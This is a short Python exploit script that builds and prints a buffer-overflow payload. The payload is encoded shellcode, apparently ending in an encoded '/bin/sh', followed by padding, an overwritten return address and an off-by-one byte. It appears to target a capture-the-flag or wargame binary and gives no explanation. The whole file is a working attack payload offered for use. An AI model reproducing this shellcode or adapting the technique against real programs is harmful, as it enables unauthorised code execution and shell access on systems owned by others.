#!/usr/bin/env python

flipped_shellcode = "\xcb\x3f\x7e\xa9\x56\x28\x11\xe0\xa8\x66\x27" \
					"\xa9\x66\x2c\x90\x2b\xa9\xd3\xad\x6e\x28\xad" \
					"\x76\x2c\xed\xa0\x11\xfb\xa9\xf8\x60\xed\xa0" \
					"\xc8\xfc\xdf\xdf\xdf\x0f\x42\x49\x4e\x0f\x53\x48"

no_op = "\x31"
a_lot_of_no_ops = no_op * (64 - 45 - 4)
flipped_ret = "\x88\xd6\xdf\x9f"
flipped_off_by_one = "\xc0"

overflow = flipped_shellcode + a_lot_of_no_ops + flipped_ret + flipped_off_by_one

print(overflow)
